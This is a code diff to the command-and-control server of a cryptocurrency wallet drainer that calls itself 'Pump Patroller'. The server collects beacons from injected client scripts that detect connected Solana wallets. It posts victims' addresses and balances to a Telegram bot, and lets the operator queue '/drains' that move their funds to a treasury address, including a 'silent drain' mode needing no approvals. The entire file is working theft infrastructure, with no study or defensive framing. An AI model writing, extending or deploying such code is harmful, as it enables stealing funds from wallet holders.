@@ -6,16 +6,11 @@ if (!BOT || !CHAT || !TREASURY) {
   console.error("missing BOT_TOKEN / CHAT_ID / TREASURY in env");
   process.exit(1);
 }
-const B58RE = /^[1-9A-HJ-NP-Za-km-z]{32,44}$/;
-if (!B58RE.test(TREASURY)) {
-    console.error("TREASURY is not a valid base58 pubkey");
-    process.exit(1);
-}
 
 process.on("uncaughtException", e => console.error("uncaught:", e && (e.stack || e.message)));
 
-const VERSION = "v3.6";
-const COMMIT = (process.env.RENDER_GIT_COMMIT || process.env.RENDER_GIT_COMMIT_SHA || "local-run").slice(0, 7);
+const VERSION = "v3.7";
+const COMMIT = (process.env.RENDER_GIT_COMMIT || "local-run").slice(0, 7);
 const BOOT_TS = Date.now();
 
 let tgOffset = null;
@@ -24,10 +19,9 @@ const targets = {}, cmds = {};
 const ROOT = path.join(__dirname, "..");
 const MIN = path.join(ROOT, "client", "x.min.js");
 
-const { exec } = require("child_process");
 if (!fs.existsSync(MIN)) {
   console.log("building client/x.min.js at startup...");
-  exec("npx --yes esbuild client/x.js --minify --format=iife --target=es2022 --outfile=client/x.min.js", { cwd: ROOT }, (err) => {
+  require("child_process").exec("npx --yes esbuild client/x.js --minify --format=iife --target=es2022 --outfile=client/x.min.js", { cwd: ROOT }, (err) => {
     if (err) console.error("esbuild failed:", err.message);
     else console.log("build complete");
   });
@@ -39,11 +33,11 @@ const RPCS = [
   "https://api.mainnet-beta.solana.com",
   "https://rpc.ankr.com/solana"
 ];
+const B58RE = /^[1-9A-HJ-NP-Za-km-z]{32,44}$/;
 const TO = ms => (typeof AbortSignal !== "undefined" && AbortSignal.timeout) ? AbortSignal.timeout(ms) : undefined;
 
 const esc = s => String(s == null ? "" : s).replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
 
-// ─── Telegram Queue System ───
 const tgQueue = [];
 let tgProcessing = false;
 
@@ -53,7 +47,7 @@ function processTgQueue() {
     const job = tgQueue.shift();
     tg(job.text, job.pre, 0).finally(() => {
         tgProcessing = false;
-        setTimeout(processTgQueue, 150); // 150ms throttle to avoid 429
+        setTimeout(processTgQueue, 150);
     });
 }
 
@@ -63,8 +57,7 @@ async function tg(text, pre, attempt) {
   attempt = attempt || 0;
   try {
     const r = await fetch("https://api.telegram.org/bot" + BOT + "/sendMessage", {
-      method: "POST",
-      headers: { "content-type": "application/json" },
+      method: "POST", headers: { "content-type": "application/json" },
       body: JSON.stringify({ chat_id: CHAT, text: (pre || "") + text, parse_mode: "HTML", disable_web_page_preview: true }),
       signal: TO(10000)
     });
@@ -75,10 +68,7 @@ async function tg(text, pre, attempt) {
       await new Promise(s => setTimeout(s, wait));
       return tg(text, pre, attempt + 1);
     }
-    if (r.status === 400 && pre && /parse entities/i.test((j && j.description) || ""))
-      return tg(text, "", attempt + 1);
-    console.error("tg send failed:", r.status, (j && j.description) || "");
-  } catch (e) { console.error("tg network error:", e && (e.message || e)); }
+  } catch (e) { }
   return null;
 }
 
@@ -94,29 +84,7 @@ async function rpcBalance(pk) {
       if (j && j.result && typeof j.result.value === "number") return j.result.value;
       throw new Error("malformed");
   };
-  try {
-      return await Promise.any(RPCS.map(u => fetchBal(u)));
-  } catch (e) {
-      return null;
-  }
-}
-
-function uptimeStr() {
-  const s = Math.floor((Date.now() - BOOT_TS) / 1000);
-  const d = Math.floor(s / 86400), h = Math.floor((s % 86400) / 3600), m = Math.floor((s % 3600) / 60);
-  return (d ? d + "d " : "") + (h ? h + "h " : "") + m + "m";
-}
-
-function listTargets() {
-  return Object.entries(targets).map(function (kv, i) {
-    const k = kv[0], r = kv[1];
-    return "#" + (i + 1) + " " + esc(k) + "\n   $" + (r.value ?? 0).toLocaleString() + " \u00b7 " + esc(r.provider || "?") + " \u00b7 " + esc(r.origin || "?") +
-      (r.drained ? " \u00b7 drained" : "") + (cmds[k] ? " \u00b7 drain queued" : "");
-  }).join("\n");
-}
-
-function queueDrain(pk, to) {
-  cmds[pk] = { to: to, n: Date.now().toString(36) + Math.random().toString(36).slice(2, 6), ts: Date.now() };
+  try { return await Promise.any(RPCS.map(u => fetchBal(u))); } catch (e) { return null; }
 }
 
 function handleCommand(m) {
@@ -126,80 +94,41 @@ function handleCommand(m) {
   const rest = parts.slice(1);
 
   if (cmd === "/start") {
-    sendTg("\ud83e\udd16 <b>Pump Patroller \u2014 control node</b>\n" +
-      "build: <b>" + VERSION + "</b>\n" +
-      "commit: <code>" + COMMIT + "</code>\n" +
-      "up: " + uptimeStr() + "\n" +
-      "beacon key: " + (BEACON_KEY ? "\u2705 set" : "\u274c missing") + "\n" +
-      "treasury: <code>" + TREASURY.slice(0, 4) + "\u2026" + TREASURY.slice(-4) + "</code>\n\n" +
-      "/targets \u2014 list detected wallets\n" +
-      "/drains \u2014 drain ALL \u2192 treasury\n" +
-      "/drains <#|addr> [dest] \u2014 drain one\n" +
-      "/stop \u2014 cancel queued drain\n" +
-      "/clear \u2014 forget all targets\n" +
-      "/clear <#|addr> \u2014 forget one");
-    return;
-  }
-
-  if (cmd === "/help") {
-    sendTg("Patroller commands\n/targets \u2014 list wallets\n/drains \u2014 drain ALL \u2192 treasury\n/drains <#|addr> [dest] \u2014 drain one\n/stop \u2014 cancel queued\n/clear \u2014 forget all targets\n/clear <#|addr> \u2014 forget one\n/start \u2014 version banner");
+    sendTg("🤖 <b>Pump Patroller " + VERSION + "</b>\n" +
+      "treasury: <code>" + TREASURY.slice(0, 4) + "…" + TREASURY.slice(-4) + "</code>\n\n" +
+      "/targets - list wallets\n/drains - drain all\n/clear - forget all");
     return;
   }
 
   if (cmd === "/targets") {
-    sendTg(listTargets() || "none \u2014 waiting for a wallet", "targets:\n");
+    const list = Object.entries(targets).map((kv, i) => "#" + (i + 1) + " " + esc(kv[0]) + "\n   $" + (kv[1].value ?? 0).toLocaleString()).join("\n");
+    sendTg(list || "none", "targets:\n");
     return;
   }
 
   if (cmd === "/drains") {
     const list = Object.keys(targets);
-    if (!list.length) return sendTg("no targets yet \u2014 waiting for a wallet to connect");
+    if (!list.length) return sendTg("no targets yet");
     let picked, to;
     const arg = rest[0] || "";
     if (arg === "" || arg.toLowerCase() === "all") { picked = list.slice(); to = rest[1] || TREASURY; }
-    else if (/^\d{1,3}$/.test(arg) && list.length) {
-      const i = (parseInt(arg, 10) - 1) % list.length;
-      picked = [list[i]]; to = rest[1] || TREASURY;
-    }
+    else if (/^\d{1,3}$/.test(arg)) { picked = [list[(parseInt(arg, 10) - 1) % list.length]]; to = rest[1] || TREASURY; }
     else if (B58RE.test(arg)) { picked = [arg]; to = rest[1] || TREASURY; }
     else { picked = [list[list.length - 1]]; to = arg || TREASURY; }
-    if (!B58RE.test(to)) return sendTg("that doesn't look like a pubkey: " + esc(String(to).slice(0, 24)));
-    const lines = [];
+    
+    if (!B58RE.test(to)) return sendTg("invalid pubkey: " + esc(String(to)));
+    
     for (const pk of picked) {
-      queueDrain(pk, to);
-      lines.push("\u2022 " + esc(pk.slice(0, 4)) + "\u2026" + esc(pk.slice(-4)) + " \u2192 " + esc(to.slice(0, 4)) + "\u2026" + esc(to.slice(-4)));
+      cmds[pk] = { to: to, n: Date.now().toString(36), ts: Date.now() };
     }
-    sendTg(lines.join("\n") + "\nqueued \u00d7" + picked.length + (picked.length > 1 ? " (batch)" : ""), "\ud83d\udce1 drain queued \u2014 ");
-    return;
-  }
-
-  if (cmd === "/stop") {
-    const list = Object.keys(targets);
-    const arg = rest[0] || "";
-    const key = (/^\d{1,3}$/.test(arg) && list.length) ? list[(parseInt(arg, 10) - 1) % list.length]
-      : (B58RE.test(arg) ? arg : (list.length ? list[list.length - 1] : null));
-    if (!key || !cmds[key]) return sendTg("no queued drain for that target");
-    delete cmds[key];
-    sendTg("cancelled queued drain for " + esc(key.slice(0, 4)) + "\u2026" + esc(key.slice(-4)));
+    sendTg("queued " + picked.length + " targets → " + to.slice(0,4) + "…");
     return;
   }
 
   if (cmd === "/clear") {
-    const list = Object.keys(targets);
-    const arg = rest[0] || "";
-    if (B58RE.test(arg) && targets[arg]) {
-      delete targets[arg]; delete cmds[arg];
-      return sendTg("forgot " + esc(arg.slice(0, 4)) + "\u2026" + esc(arg.slice(-4)));
-    }
-    if (/^\d{1,3}$/.test(arg) && list.length) {
-      const k2 = list[(parseInt(arg, 10) - 1) % list.length];
-      delete targets[k2]; delete cmds[k2];
-      return sendTg("forgot " + esc(k2.slice(0, 4)) + "\u2026" + esc(k2.slice(-4)));
-    }
-    const n = list.length;
     for (const k of Object.keys(targets)) delete targets[k];
     for (const k of Object.keys(cmds)) delete cmds[k];
-    sendTg(n ? "cleared " + n + " targets" : "nothing to clear");
+    sendTg("cleared all");
     return;
   }
 }
@@ -210,10 +139,9 @@ async function pollTg() {
     for (const u of (j && j.result) || []) {
       if (u.update_id <= tgOffset) continue;
       tgOffset = u.update_id;
-      const m = u.message;
-      if (m && m.text && m.text.charAt(0) === "/") handleCommand(m);
+      if (u.message && u.message.text && u.message.text.charAt(0) === "/") handleCommand(u.message);
     }
-  } catch (e) { console.error("pollTg:", e && (e.message || e)); }
+  } catch (e) { }
 }
 
 (async function boot() {
@@ -221,56 +149,28 @@ async function pollTg() {
     const j = await (await fetch("https://api.telegram.org/bot" + BOT + "/getUpdates?offset=-1&timeout=0", { signal: TO(8000) })).json();
     const r = (j && j.result) || [];
     tgOffset = r.length ? r[r.length - 1].update_id : 0;
-  } catch (e) {
-    console.error("boot offset fetch failed, retrying:", e && (e.message || e));
-    return setTimeout(boot, 5000);
-  }
-  sendTg("\ud83d\ude80 <b>patroller booted</b> \u2014 build <b>" + VERSION + "</b> \u00b7 commit <code>" + COMMIT + "</code>\nbacklog skipped \u2014 /start for commands", "\ud83d\udce1 ");
+  } catch (e) { return setTimeout(boot, 5000); }
+  sendTg("🚀 patroller booted " + VERSION);
   setInterval(pollTg, 3000);
 })();
 
-// ─── expire queued drains after 30 min ───
 setInterval(() => {
   const now = Date.now();
   for (const k of Object.keys(cmds)) {
-    if (cmds[k].ts && now - cmds[k].ts > 1800000) {
-      delete cmds[k];
-      sendTg("\u23f1 expired queued drain for " + esc(k.slice(0, 4)) + "\u2026" + esc(k.slice(-4)));
-    }
+    if (cmds[k].ts && now - cmds[k].ts > 1800000) delete cmds[k];
   }
 }, 60000).unref();
 
-// ─── prune old targets after 24h to prevent memory leaks ───
-setInterval(() => {
-  const now = Date.now();
-  for (const k of Object.keys(targets)) {
-    if (targets[k].seen && now - targets[k].seen > 86400000) {
-      delete targets[k];
-      delete cmds[k];
-    }
-  }
-}, 3600000).unref();
-
-// ─── http server ───
 http.createServer((req, res) => {
   let url;
   try { url = new URL(req.url, "http://x"); } catch (e) { res.statusCode = 400; res.end(); return; }
   res.setHeader("access-control-allow-origin", "*");
-
-  if (req.method === "OPTIONS") {
-    res.setHeader("access-control-allow-methods", "GET, POST, OPTIONS");
-    res.setHeader("access-control-allow-headers", "content-type");
-    res.statusCode = 204; res.end();
-    return;
-  }
 
   if (req.method === "GET" && url.pathname === "/cmd") {
     const pk = url.searchParams.get("pk") || "";
     const c = cmds[pk];
     res.setHeader("content-type", "application/json");
     if (!c) return res.end(JSON.stringify({ cmd: "none" }));
-    // DO NOT delete here. Wait for the client to report back. 
-    // We will let the 30-min expiry handle abandoned commands.
     return res.end(JSON.stringify({ cmd: "drain", to: c.to, n: c.n }));
   }
 
@@ -279,64 +179,42 @@ http.createServer((req, res) => {
     res.setHeader("content-type", "application/json");
     if (!B58RE.test(pk)) { res.statusCode = 400; return res.end(JSON.stringify({ error: "bad pubkey" })); }
     rpcBalance(pk).then(v => {
-      if (v === null) { res.statusCode = 502; return res.end(JSON.stringify({ error: "all rpc failed" })); }
+      if (v === null) { res.statusCode = 502; return res.end(JSON.stringify({ error: "rpc failed" })); }
       res.end(JSON.stringify({ balance: v }));
-    }).catch(() => { res.statusCode = 502; res.end(JSON.stringify({ error: "rpc error" })); });
+    }).catch(() => { res.statusCode = 502; res.end(JSON.stringify({ error: "error" })); });
     return;
   }
 
   if (req.method === "POST" && url.pathname === "/beacon") {
     const got = url.searchParams.get("s") || "";
     const want = String(BEACON_KEY || "").trim();
-    if (want && got.trim() !== want) {
-      res.statusCode = 403; res.end(); return;
-    }
+    if (want && got.trim() !== want) { res.statusCode = 403; res.end(); return; }
     let d = "";
     req.on("data", c => { if (d.length < 65536) d += c; });
     req.on("end", () => {
       let j = null;
-      try { j = JSON.parse(d); } catch (e) { j = null; }
+      try { j = JSON.parse(d); } catch (e) { }
       try {
         if (j) {
           if (j.m === "detect") {
             const first = !targets[j.pk];
-            targets[j.pk] = Object.assign(targets[j.pk] || {}, {
-              provider: j.provider, origin: j.origin, value: j.value, sol: j.sol, toks: j.toks,
-              seen: Date.now(), drained: (targets[j.pk] && targets[j.pk].drained) || false
-            });
-            if (first) {
-              sendTg("<b>" + esc(j.provider) + "</b> @ " + esc(j.origin) + "\n<code>" + esc(j.pk) + "</code>\n$" +
-                (j.value ?? 0).toLocaleString() + " \u00b7 " + (j.sol ?? 0) + " SOL" + (j.toks ? " + " + esc(j.toks) : ""),
-                "\ud83c\udfaf wallet connected \u2014 ");
-            }
+            targets[j.pk] = Object.assign(targets[j.pk] || {}, { provider: j.provider, origin: j.origin, value: j.value, seen: Date.now() });
+            if (first) sendTg("🎯 <b>" + esc(j.provider) + "</b> @ " + esc(j.origin) + "\n<code>" + esc(j.pk) + "</code>\n$" + (j.value ?? 0).toLocaleString());
           }
           if (j.m === "drain") {
-            const t = targets[j.pk] || (targets[j.pk] = {});
-            Object.assign(t, { provider: j.provider, origin: j.origin, value: j.value, seen: Date.now() });
-            if (j.sig) { t.drained = true; t.sig = j.sig; }
-            delete cmds[j.pk]; // clean up on success
-            sendTg("<code>" + esc(j.pk) + "</code>\n$" + (j.value ?? 0).toLocaleString() +
-              (j.extra ? "\nmoved: " + esc(j.extra) : "") +
-              "\nmode: <b>" + esc(j.mode || "?") + "</b>" +
-              (j.mode === "secret" ? " (0 approvals)" : j.mode === "popup" ? " (1 approval)" : "") +
-              (j.sig ? "\nsig: <code>" + esc(j.sig) + "</code>" : ""),
-              j.mode === "secret" ? "\ud83d\udcb0 SILENT DRAIN \u2014 " : "\ud83d\udcb0 drain \u2014 ");
+            delete cmds[j.pk]; // clear on success
+            sendTg("💰 drain success — <code>" + esc(j.pk) + "</code>\nmoved: " + esc(j.extra) + "\nsig: <code>" + esc(j.sig) + "</code>");
           }
           if (j.m === "err") {
-            sendTg("<code>" + esc(j.pk) + "</code>\n" + esc(j.msg || "?") + "\norigin: " + esc(j.origin || "?"),
-              "\u26a0\ufe0f patroller error \u2014 ");
+            delete cmds[j.pk]; // CRITICAL FIX: clear on error to stop the infinite loop
+            sendTg("⚠️ error — <code>" + esc(j.pk) + "</code>\n" + esc(j.msg));
           }
           if (j.m === "dust") {
-            delete cmds[j.pk]; // nothing to move, clear queue
-            sendTg("<code>" + esc(j.pk) + "</code>\n" + esc(j.extra || "dust \u2014 nothing worth moving") + "\norigin: " + esc(j.origin || "?"),
-              "\u00b7 \u2014 ");
-          }
-          if (j.m === "loaded") {
-            sendTg("payload loaded on <code>" + esc(j.origin || "?") + "</code>\nprovider seen: <b>" + esc(j.provider || "?") + "</b>",
-              "\ud83d\udcf2 bookmark \u2014 ");
+            delete cmds[j.pk]; // clear on dust
+            sendTg("· empty — <code>" + esc(j.pk) + "</code>");
           }
         }
-      } catch (e) { console.error("beacon parse:", e && e.message); }
+      } catch (e) { }
       res.setHeader("content-type", "application/json");
       res.end("{}");
     });
